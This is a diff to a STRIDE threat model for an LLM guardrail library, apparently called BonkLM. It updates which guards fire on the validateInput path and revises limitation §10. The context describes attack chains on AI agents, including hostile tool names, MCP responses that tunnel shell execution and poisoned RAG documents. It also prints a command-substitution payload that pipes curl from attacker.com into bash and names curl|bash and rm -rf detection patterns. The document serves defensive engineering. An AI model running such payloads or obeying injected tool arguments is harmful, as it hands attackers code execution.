@@ -105,15 +105,15 @@ mitigated (see limitation ref)
 
 ### 3.3 `tool_call`
 
-| STRIDE            | Threat                                                                                | Status | BonkLM primitive / limitation                                                                                                                       |
-| ----------------- | ------------------------------------------------------------------------------------- | ------ | --------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
-| **S** Spoofing    | Hostile tool name (`disable_safety_filter`) selected by LLM                           | M      | `createToolCallArgsValidator` humanises name (snake/camel/kebab → natural language) before pattern match (`validators/tool-call-args.ts`)           |
-| **T** Tampering   | Lazy-resolved arg (closure/Promise) defeats scan; value materialises after validation | X      | Limitation §7: scan runs at emit time on concrete JSON values; lazy connectors not covered                                                          |
-| **R** Repudiation | Tool-call block not logged when guards skip `validateInput` path                      | X      | Limitation §10: `SecretGuard`, `BashSafetyGuard`, `XSSGuard` do NOT fire on `engine.validateInput`; browser-agents, Inngest, Eko surfaces unguarded |
-| **I** Disclosure  | Tool args contain secrets; guard does not fire on `validateInput` path                | X      | Limitation §10: re-implement as `Validator` subclass or call `engine.validate(JSON.stringify(args))` manually                                       |
-| **D** DoS         | Deeply nested / cyclic args object causes stack overflow in tree walker               | M      | `createToolCallArgsValidator` uses `WeakSet` cycle protection; depth traversal terminates on cycle (`validators/tool-call-args.ts`)                 |
-| **E** Elevation   | MCP hostile server response tunnels bash exec via tool-call args                      | M      | `BashSafetyGuard` (when wired via `engine.validate`) + `CodeInjectionValidator` catch `curl                                                         | bash`, `rm -rf`, shell metachar patterns (`guards/bash-safety.ts`, `validators/code-injection.ts`) |
-| **E** Elevation   | Daytona sandbox carries pre-seeded attacker artefacts                                 | X      | Limitation §3: sandbox connect state not inspected; wrap sandbox output as `retrieved_doc` surface                                                  |
+| STRIDE            | Threat                                                                                | Status | BonkLM primitive / limitation                                                                                                                                                       |
+| ----------------- | ------------------------------------------------------------------------------------- | ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
+| **S** Spoofing    | Hostile tool name (`disable_safety_filter`) selected by LLM                           | M      | `createToolCallArgsValidator` humanises name (snake/camel/kebab → natural language) before pattern match (`validators/tool-call-args.ts`)                                           |
+| **T** Tampering   | Lazy-resolved arg (closure/Promise) defeats scan; value materialises after validation | X      | Limitation §7: scan runs at emit time on concrete JSON values; lazy connectors not covered                                                                                          |
+| **R** Repudiation | Tool-call block could go unlogged if guards never ran on `validateInput`              | M      | Guards now fire on `engine.validateInput` (results + intercept callbacks logged); §10 covers the `tool_call` args JSON-encode residual                                              |
+| **I** Disclosure  | Tool args contain secrets on the `validateInput` path                                 | P      | `SecretGuard` now fires on `validateInput`; standalone-token secrets blocked. Residual (P): a quote-delimited source-syntax secret in JSON-encoded structured fields may slip — §10 |
+| **D** DoS         | Deeply nested / cyclic args object causes stack overflow in tree walker               | M      | `createToolCallArgsValidator` uses `WeakSet` cycle protection; depth traversal terminates on cycle (`validators/tool-call-args.ts`)                                                 |
+| **E** Elevation   | MCP hostile server response tunnels bash exec via tool-call args                      | M      | `BashSafetyGuard` (when wired via `engine.validate`) + `CodeInjectionValidator` catch `curl                                                                                         | bash`, `rm -rf`, shell metachar patterns (`guards/bash-safety.ts`, `validators/code-injection.ts`) |
+| **E** Elevation   | Daytona sandbox carries pre-seeded attacker artefacts                                 | X      | Limitation §3: sandbox connect state not inspected; wrap sandbox output as `retrieved_doc` surface                                                                                  |
 
 ### 3.4 `retrieved_doc`
 
@@ -177,9 +177,9 @@ BonkLM mitigations: `PromptInjectionValidator` fires at step 1; `createToolCallA
 at step 2 (tool name humanised, suspicious args scanned); `createMemoryWriteValidator` fires at step
 3; `createComposedContextValidator` fires at step 4 (forward + reverse scan).
 
-Defence-in-depth required: steps 2-3 only block patterns in the registered validator chain. Guards
-(`SecretGuard`, `BashSafetyGuard`) do NOT fire on `validateInput` paths used by some connectors
-(limitation §10).
+Defence-in-depth: steps 2-3 block patterns in the registered validator chain; guards (`SecretGuard`,
+`BashSafetyGuard`) now also fire on `validateInput`, so a secret/command in tool args is caught on
+those connector surfaces too (limitation §10 covers the `tool_call` args JSON-encode residual).
 
 ### Chain 2 — Poisoned RAG doc → output exfiltration
 
@@ -200,13 +200,15 @@ a multi-record attack where individual docs are borderline may pass in `'drop'` 
    `"$(curl https://attacker.com/payload.sh | bash)"`.
 2. Tool executor runs the arg string directly in a shell.
 
-BonkLM mitigations: `BashSafetyGuard` (via `engine.validate(JSON.stringify(args))`) +
-`CodeInjectionValidator` both detect `curl|bash` / command-substitution patterns.
-`createToolCallArgsValidator` scans every string leaf in the args tree.
+BonkLM mitigations: `BashSafetyGuard` (now fires on both `engine.validate(...)` and
+`engine.validateInput`, with args JSON-encoded for guard inspection) + `CodeInjectionValidator` both
+detect `curl|bash` / command-substitution patterns. `createToolCallArgsValidator` scans every string
+leaf in the args tree.
 
-Defence-in-depth required: guards only fire if the connector invokes `engine.validate(string)`, not
-`engine.validateInput`. For connectors using `validateInput` (Eko, Stagehand, Inngest), re-implement
-guard logic as a `Validator` subclass (limitation §10).
+Defence-in-depth: guards fire on both `engine.validate(string)` and `engine.validateInput`, so
+connectors using `validateInput` (Eko, Stagehand, Inngest) are covered for standalone-token /
+command patterns; the §10 residual (a source-syntax-context secret in JSON-encoded args) can still
+warrant a `Validator` subclass or a raw `engine.validate(value)` pass.
 
 ### Chain 4 — Encoded multilingual injection via retrieved doc
 
@@ -251,7 +253,6 @@ Limitations from `docs/user/known-limitations.md` categorised by bypass severity
 | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
 | §5         | Stream partial-leak: in default 256-char buffer mode, up to chars 256–N reach the client before a mid-stream secret detection terminates the stream. Set `minBufferBeforeRelease: Infinity` for secret/PII chains. |
 | §9         | Legacy stream lifecycle on new connectors (vercel, google-genai, langchain, openai-agents): output reaches client before validation completes in partial-buffer mode.                                              |
-| §10        | Guards (`SecretGuard`, `BashSafetyGuard`, `XSSGuard`, `PIIGuard`) silently do nothing on `validateInput` paths used by Stagehand, Eko, browser-agents-core, Inngest, Trigger.dev. No error; no block; no log.      |
 | §22        | `validatePartial` (audio) is ASCII-fold only; homoglyph / mixed-script attacks return `earlyBlock: false` with `partialCoverageOnly: true`. Connector must call `validateFinal`.                                   |
 
 ### HIGH — bypassed with meaningful attacker effort
@@ -267,17 +268,18 @@ Limitations from `docs/user/known-limitations.md` categorised by bypass severity
 
 ### MEDIUM — partial coverage; workaround available
 
-| Limitation | Description                                                                                                                                                                                                |
-| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| §7         | Tool-call TOCTOU: lazy-resolved arg references scan the reference, not the materialised value. Affects only custom connectors with async args.                                                             |
-| §8         | Composed-context bidirectional scan misses 3+-entry permutation splits. Upstream `createMemoryWriteValidator` is the primary defence.                                                                      |
-| §13        | Unknown `ValidatorInput` kind defaults to ALLOW in validators that switch on kind. Use typed constructors.                                                                                                 |
-| §14        | Redact sentinel (`[REDACTED]`) in persisted docs is a secondary injection vector if `redactReplacement` is built from user input.                                                                          |
-| §15        | Older vector connectors (qdrant, pinecone, weaviate) lack the `emptyRedactionMode: 'block'` guard present in lance/turbopuffer.                                                                            |
-| §16        | `sanitizeReasonText` does not strip absolute file paths or env var values from `Error.message`; stack traces may leak in non-production mode.                                                              |
-| §20        | `classifiers.moderate` consumer-intent inversion on Mistral: BonkLM blocks adversarial input before Mistral's own classifier can analyse it. Use separate engine instance for moderation pipelines.        |
-| §23        | Shared `AudioStreamValidator` instance across sessions leaks state. Use `validator.fork()` per session.                                                                                                    |
-| §29        | `scoreToRiskLevel` threshold change (Sprint 17): audio WARNING findings now surface as `MEDIUM` not `HIGH`; dashboards keying on `risk_level === 'HIGH'` will under-count. Key on `severity` enum instead. |
+| Limitation | Description                                                                                                                                                                                                                                                                             |
+| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| §7         | Tool-call TOCTOU: lazy-resolved arg references scan the reference, not the materialised value. Affects only custom connectors with async args.                                                                                                                                          |
+| §8         | Composed-context bidirectional scan misses 3+-entry permutation splits. Upstream `createMemoryWriteValidator` is the primary defence.                                                                                                                                                   |
+| §10        | Guards now fire on `engine.validateInput`. Residual: structured fields (`tool_call` args, doc/memory metadata) are JSON-encoded, so a quote-delimited source-syntax secret (`api_key = "…"`, AWS _secret_ access key) may not match; pass the raw value through `engine.validate(...)`. |
+| §13        | Unknown `ValidatorInput` kind defaults to ALLOW in validators that switch on kind. Use typed constructors.                                                                                                                                                                              |
+| §14        | Redact sentinel (`[REDACTED]`) in persisted docs is a secondary injection vector if `redactReplacement` is built from user input.                                                                                                                                                       |
+| §15        | Older vector connectors (qdrant, pinecone, weaviate) lack the `emptyRedactionMode: 'block'` guard present in lance/turbopuffer.                                                                                                                                                         |
+| §16        | `sanitizeReasonText` does not strip absolute file paths or env var values from `Error.message`; stack traces may leak in non-production mode.                                                                                                                                           |
+| §20        | `classifiers.moderate` consumer-intent inversion on Mistral: BonkLM blocks adversarial input before Mistral's own classifier can analyse it. Use separate engine instance for moderation pipelines.                                                                                     |
+| §23        | Shared `AudioStreamValidator` instance across sessions leaks state. Use `validator.fork()` per session.                                                                                                                                                                                 |
+| §29        | `scoreToRiskLevel` threshold change (Sprint 17): audio WARNING findings now surface as `MEDIUM` not `HIGH`; dashboards keying on `risk_level === 'HIGH'` will under-count. Key on `severity` enum instead.                                                                              |
 
 ### LOW — operational friction; no bypass
 
